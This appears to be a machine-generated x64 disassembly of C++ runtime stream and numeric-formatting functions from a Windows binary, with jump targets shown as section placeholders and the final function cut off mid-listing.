lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov edx 0xa
mov rcx rax
mov rsi rax
call sub_1400085e0
mov rcx [ rsi ]
xor ebx ebx
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
nop
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove ebx ecx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
movzx eax dil
add rsp 0x20
pop rdi
retn
mov ecx [ rbx ]
call sub_140008150
add rbx 0x4
movzx edi al
cmp rbx [ rsi + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
test dil dil
jne r-xdata
test al al
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_140008400
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14d edx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_140003240
nop
mov rcx rax
call sub_14000b0c0
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_1400103c0
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] ax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x30 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_1400085e0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x68 ] rsi
movzx edi dx
mov rbx rcx
xor esi esi
mov [ rsp + 0x60 ] esi
mov [ rsp + 0x28 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
jne r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rcx [ rcx + rbx + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov ecx 0x4
jmp r-xdata
call sub_1400103c0
mov rax [ rcx ]
movzx edx di
call [ rax + 0x18 ]
movzx edi ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
test ecx ecx
je r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
jmp r-xdata
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ r9 + 0x10 ]
or edx ecx
cmp [ r9 + 0x48 ] 0x0
jne r-xdata
mov ecx 0x4
mov eax 0xffff
cmp ax di
cmove esi ecx
mov ecx esi
mov [ rsp + 0x60 ] ecx
jmp r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400112c0
nop
xor r8d r8d
mov rcx r9
call sub_140003120
nop
or edx 0x4
mov rax rbx
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x40
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
sub_140008730
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xc8
mov [ rbp - 0x59 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r14 r9
mov r15 r8
mov rbx rdx
mov [ rbp - 0x69 ] rdx
movzx r13d [ rbp + 0x77 ]
test [ r9 + 0x18 ] 0x4000
jne r-xdata
lea rdx [ rsp + 0x30 ]
mov rcx r9
call sub_140003240
nop
mov rcx rax
call sub_14000b210
mov rsi rax
xor r12d r12d
mov rdi [ rsp + 0x30 ]
test rdi rdi
je r-xdata
movups xmm0 [ r8 ]
movaps [ rbp - 0x69 ] xmm0
mov r10 [ rcx ]
movzx edx [ rbp + 0x7f ]
mov [ rsp + 0x28 ] edx
mov [ rsp + 0x20 ] r13w
lea r8 [ rbp - 0x69 ]
mov rdx rbx
call [ r10 + 0x38 ]
jmp r-xdata
mov [ rbp - 0x39 ] 0x7
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] r12w
lea rdx [ rbp - 0x29 ]
mov rcx rsi
cmp [ rbp + 0x7f ] 0x0
je r-xdata
xor edx edx
lea rcx [ rbp - 0x79 ]
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
mov rax rbx
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xc8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
call sub_14000a430
mov rbx rax
lea rax [ rbp - 0x51 ]
cmp rax rbx
je r-xdata
call sub_14002aea0
mov rbx rax
lea rax [ rbp - 0x51 ]
cmp rax rbx
je r-xdata
mov rbx r12
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rbp - 0x79 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
cmp [ rbp - 0x39 ] 0x8
jb r-xdata
jmp r-xdata
cmp [ rbp - 0x39 ] 0x8
jb r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
mov rdi [ r14 + 0x28 ]
mov rsi [ rbp - 0x41 ]
test rdi rdi
jle r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_14003ad04
mov [ rbp - 0x39 ] 0x7
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] r12w
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_14003ad04
mov [ rbp - 0x39 ] 0x7
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] r12w
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_14003ad04
mov rdi r12
cmp rdi rsi
jbe r-xdata
mov rax [ rbx ]
mov [ rbp - 0x51 ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp - 0x51 ]
call sub_14003a8c0
jmp r-xdata
mov rax [ rbx ]
mov [ rbp - 0x51 ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp - 0x51 ]
call sub_14003a8c0
jmp r-xdata
movups xmm0 [ r15 ]
movaps [ rsp + 0x30 ] xmm0
lea r12 [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x8
cmovae r12 [ rbp - 0x51 ]
test rsi rsi
je r-xdata
movups xmm0 [ r15 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
sub rdi rsi
jmp r-xdata
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x41 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x39 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x41 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x39 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
movups [ r15 ] xmm0
mov [ r14 + 0x28 ] 0x0
movups xmm0 [ r15 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x38 ]
movups [ r15 ] xmm0
mov rdi r12
mov rbx [ rsp + 0x38 ]
mov eax [ r14 + 0x18 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov rbx [ rbp - 0x69 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x39 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x38 ]
mov esi 0xffff
nop [ rax ] eax
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_14003ad04
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movzx r8d [ r12 ]
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
mov rax [ rbx ]
movzx edx r8w
mov rcx rbx
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
mov rsi [ rbp - 0x41 ]
movaps xmm0 [ rsp + 0x30 ]
mov rax [ rbx ]
movzx edx r13w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
mov rax [ rbx ]
movzx edx r13w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
add r12 0x2
dec rsi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r13w
movzx eax r13w
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r13w
movzx eax r13w
jmp r-xdata
mov ecx 0xffff
cmp cx r8w
jne r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp si ax
jne r-xdata
sub_140008b10
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov eax [ r9 + 0x18 ]
mov rsi rcx
mov rbx r9
mov rdi rdx
mov [ rsp + 0x50 ] 0x25
lea rcx [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test al 0x20
je r-xdata
test al 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rcx [ rsp + 0x52 ]
mov edx eax
mov [ rcx ] 0x6c
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rcx ] 0x23
inc rcx
cmp edx 0x800
je r-xdata
mov al 0x6f
jmp r-xdata
shl al 0x3
not al
and al 0x20
or al 0x58
mov al 0x64
jmp r-xdata
mov r9d [ rsp + 0xf8 ]
mov [ rcx + 0x1 ] al
mov [ rcx + 0x2 ] 0x0
lea rcx [ rsp + 0x60 ]
lea r8 [ rsp + 0x50 ]
mov edx 0x40
call sub_14003b81c
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rdx eax
lea rax [ rsp + 0x60 ]
mov rcx rsi
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rdi
call sub_14000a060
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_140008c10
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov eax [ r9 + 0x18 ]
mov rsi rcx
mov rbx r9
mov rdi rdx
mov [ rsp + 0x50 ] 0x25
lea rcx [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test al 0x20
je r-xdata
test al 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rcx [ rsp + 0x52 ]
mov edx eax
mov [ rcx ] 0x6c
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rcx ] 0x23
inc rcx
cmp edx 0x800
je r-xdata
mov al 0x6f
jmp r-xdata
shl al 0x3
not al
and al 0x20
or al 0x58
mov al 0x75
jmp r-xdata
mov r9d [ rsp + 0xf8 ]
mov [ rcx + 0x1 ] al
mov [ rcx + 0x2 ] 0x0
lea rcx [ rsp + 0x60 ]
lea r8 [ rsp + 0x50 ]
mov edx 0x40
call sub_14003b81c
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rdx eax
lea rax [ rsp + 0x60 ]
mov rcx rsi
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rdi
call sub_14000a060
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_140008d10
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov rsi rcx
mov ecx [ r9 + 0x18 ]
mov rbx r9
mov rdi rdx
mov [ rsp + 0x50 ] 0x25
lea rax [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test cl 0x20
je r-xdata
test cl 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rax [ rsp + 0x52 ]
mov edx ecx
mov [ rax ] 0x3649
mov [ rax + 0x2 ] 0x34
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rax ] 0x23
inc rax
cmp edx 0x800
je r-xdata
mov cl 0x6f
jmp r-xdata
shl cl 0x3
not cl
and cl 0x20
or cl 0x58
mov cl 0x64
jmp r-xdata
mov r9 [ rsp + 0xf8 ]
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x60 ]
mov edx 0x40
mov [ rax + 0x4 ] 0x0
call sub_14003b81c
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rdx eax
lea rax [ rsp + 0x60 ]
mov rcx rsi
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rdi
call sub_14000a060
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_140008e10
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov rsi rcx
mov ecx [ r9 + 0x18 ]
mov rbx r9
mov rdi rdx
mov [ rsp + 0x50 ] 0x25
lea rax [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test cl 0x20
je r-xdata
test cl 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rax [ rsp + 0x52 ]
mov edx ecx
mov [ rax ] 0x3649
mov [ rax + 0x2 ] 0x34
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rax ] 0x23
inc rax
cmp edx 0x800
je r-xdata
mov cl 0x6f
jmp r-xdata
shl cl 0x3
not cl
and cl 0x20
or cl 0x58
mov cl 0x75
jmp r-xdata
mov r9 [ rsp + 0xf8 ]
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x60 ]
mov edx 0x40
mov [ rax + 0x4 ] 0x0
call sub_14003b81c
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rdx eax
lea rax [ rsp + 0x60 ]
mov rcx rsi
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rdi
call sub_14000a060
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_140008f10
push rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rbx [ r9 + 0x20 ]
mov rbp r9
mov r12 rdx
mov r13 rcx
test rbx rbx
jg r-xdata
mov edx [ rbp + 0x18 ]
movsd xmm1 [ rsp + 0x158 ]
mov eax 0x24
cmp rbx rax
mov r9d ebx
cmovg r9d eax
xor esi esi
movsxd rax r9d
mov edi esi
sub rbx rax
mov eax edx
and eax 0x3000
cmp eax 0x2000
jne r-xdata
test [ r9 + 0x18 ] 0x2000
jne r-xdata
movups xmm0 [ r8 ]
mov [ rsp + 0x60 ] 0x25
lea rax [ rsp + 0x61 ]
movaps [ rsp + 0x50 ] xmm0
test dl 0x20
je r-xdata
movapd xmm0 xmm1
mulsd xmm0 [ r--data ]
ucomisd xmm0 xmm1
jpe r-xdata
mov ebx 0x6
test dl 0x10
je r-xdata
mov [ rsp + 0x61 ] 0x2b
lea rax [ rsp + 0x62 ]
xorpd xmm3 xmm3
movsd xmm4 [ r--data ]
comisd xmm3 xmm1
jbe r-xdata
je r-xdata
and edx 0x3000
mov [ rax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ rax ] 0x23
inc rax
xor al al
mov al 0x1
xorpd xmm1 xmm4
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
comisd xmm1 xmm3
jbe r-xdata
cmp rsi 0x1388
jae r-xdata
movsd xmm0 [ r--data ]
movsd xmm2 [ r--data ]
comisd xmm1 xmm0
jb r-xdata
mov ecx 0x67
mov r8d 0x65
cmp edx 0x1000
cmove ecx r8d
mov cl 0x61
jmp r-xdata
mov [ rax + 0x2 ] cl
lea r8 [ rsp + 0x60 ]
lea rcx [ rsp + 0x70 ]
movsd [ rsp + 0x20 ] xmm1
mov edx 0x6c
mov [ rax + 0x3 ] 0x0
call sub_14003b81c
lea r8 [ rsp + 0x50 ]
mov r9 rbp
movsxd rdx eax
lea rax [ rsp + 0x70 ]
mov rcx r13
mov [ rsp + 0x48 ] rdx
movzx edx [ rsp + 0x150 ]
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx r12
call sub_140009520
mov rax r12
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xf8
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
test al al
je r-xdata
cmp rbx 0xa
jl r-xdata
divsd xmm1 xmm2
add rsi 0xa
comisd xmm1 xmm0
jae r-xdata
xorpd xmm1 xmm4
movsd xmm0 [ r--data ]
nop
cmp rdi 0x1388
jae r-xdata
sub rbx 0xa
add rdi 0xa
mulsd xmm1 xmm2
cmp rbx 0xa
jge r-xdata
comisd xmm0 xmm1
jb r-xdata
sub_140009120
push rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rbx [ r9 + 0x20 ]
mov rbp r9
mov r12 rdx
mov r13 rcx
test rbx rbx
jg r-xdata
mov edx [ rbp + 0x18 ]
movsd xmm1 [ rsp + 0x158 ]
mov eax 0x24
cmp rbx rax
mov r9d ebx
cmovg r9d eax
xor esi esi
movsxd rax r9d
mov edi esi
sub rbx rax
mov eax edx
and eax 0x3000
cmp eax 0x2000
jne r-xdata
test [ r9 + 0x18 ] 0x2000
jne r-xdata
movups xmm0 [ r8 ]
mov [ rsp + 0x60 ] 0x25
lea rax [ rsp + 0x61 ]
movaps [ rsp + 0x50 ] xmm0
test dl 0x20
je r-xdata
xorpd xmm3 xmm3
movsd xmm4 [ r--data ]
comisd xmm3 xmm1
jbe r-xdata
mov ebx 0x6
test dl 0x10
je r-xdata
mov [ rsp + 0x61 ] 0x2b
lea rax [ rsp + 0x62 ]
xor al al
mov al 0x1
xorpd xmm1 xmm4
jmp r-xdata
and edx 0x3000
mov [ rax ] 0x2a2e
mov [ rax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ rax ] 0x23
inc rax
comisd xmm1 xmm3
jbe r-xdata
nop [ rax ] eax
movsd xmm0 [ r--data ]
movsd xmm2 [ r--data ]
comisd xmm1 xmm0
jb r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
test al al
je r-xdata
cmp rbx 0xa
jl r-xdata
divsd xmm1 xmm2
add rsi 0xa
comisd xmm1 xmm0
jae r-xdata
mov ecx 0x67
mov r8d 0x65
cmp edx 0x1000
cmove ecx r8d
mov cl 0x61
jmp r-xdata
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x60 ]
lea rcx [ rsp + 0x70 ]
movsd [ rsp + 0x20 ] xmm1
mov edx 0x6c
mov [ rax + 0x4 ] 0x0
call sub_14003b81c
lea r8 [ rsp + 0x50 ]
mov r9 rbp
movsxd rdx eax
lea rax [ rsp + 0x70 ]
mov rcx r13
mov [ rsp + 0x48 ] rdx
movzx edx [ rsp + 0x150 ]
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx r12
call sub_140009520
mov rax r12
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xf8
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
xorpd xmm1 xmm4
movsd xmm0 [ r--data ]
nop [ rax + rax ] eax
cmp rsi 0x1388
jae r-xdata
cmp rdi 0x1388
jae r-xdata
sub rbx 0xa
add rdi 0xa
mulsd xmm1 xmm2
cmp rbx 0xa
jge r-xdata
comisd xmm0 xmm1
jb r-xdata
sub_140009320
push rbx
push rsi
push rdi
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
movups xmm0 [ r8 ]
mov rdi r9
mov r9 [ rsp + 0xe8 ]
mov rbx rcx
mov rsi rdx
lea r8 [ r--data ]
lea rcx [ rsp + 0x50 ]
mov edx 0x40
movaps [ rsp + 0x40 ] xmm0
call sub_14003b81c
lea r8 [ rsp + 0x40 ]
mov r9 rdi
movsxd rdx eax
lea rax [ rsp + 0x50 ]
mov rcx rbx
mov [ rsp + 0x30 ] rdx
movzx edx [ rsp + 0xe0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dx
mov rdx rsi
call sub_14000a060
mov rax rsi
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xa0
pop rdi
pop rsi
pop rbx
retn
sub_1400093c0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
mov rsi r8
mov r8 [ rcx + 0x10 ]
movzx r12d r9b
mov rbp rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
or rax 0xffffffffffffffff
sub rax r8
cmp rax rsi
ja r-xdata
lea rcx [ r--data ]
call sub_140037948
mov [ rsp + 0x30 ] rdi
test rsi rsi
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rdi [ r8 + rsi ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_1400061b0
test rdi rdi
je r-xdata
mov rax [ rbx + 0x18 ]
cmp rax 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov r8 [ rbx + 0x10 ]
lea rdx [ rcx + rbp ]
lea rcx [ rax + rbp ]
sub r8 rbp
add rcx rsi
call sub_14003a8c0
cmp rsi 0x1
jne r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + rbp ] r12b
jmp r-xdata
mov rax [ rbx ]
mov [ rax + rbp ] r12b
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rcx [ rax + rbp ]
movsx edx r12b
mov r8 rsi
call sub_14003d760
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_140009520
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x38 ]
sub rsp 0x138
mov [ rbp - 0x40 ] 0xfffffffffffffffe
movaps [ rsp + 0x120 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x18 ] rax
mov [ rbp - 0x70 ] r9
mov [ rsp + 0x60 ] r8
mov [ rbp - 0x68 ] rdx
mov [ rsp + 0x78 ] rcx
movzx r15d [ rbp + 0xa0 ]
mov [ rsp + 0x5a ] r15w
mov rbx [ rbp + 0xa8 ]
mov [ rsp + 0x68 ] rbx
mov rsi [ rbp + 0xb0 ]
mov [ rbp - 0x78 ] rsi
mov rax [ rbp + 0xb8 ]
mov [ rbp - 0x80 ] rax
mov r14 [ rbp + 0xc0 ]
mov r12 [ rbp + 0xc8 ]
lea rdx [ rbp - 0x58 ]
mov rcx r9
call sub_140003240
nop
mov rcx rax
call sub_14000b210
mov r13 rax
mov [ rbp - 0x60 ] rax
mov rdi [ rbp - 0x58 ]
test rdi rdi
je r-xdata
lea rdx [ rbp - 0x10 ]
mov rcx r13
call sub_14002b150
nop
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x10 ]
mov [ rsp + 0x58 ] ax
mov [ rbp - 0x20 ] 0xf
xor edi edi
mov [ rbp - 0x28 ] rdi
mov [ rbp - 0x38 ] dil
mov [ rsp + 0x30 ] 0x30
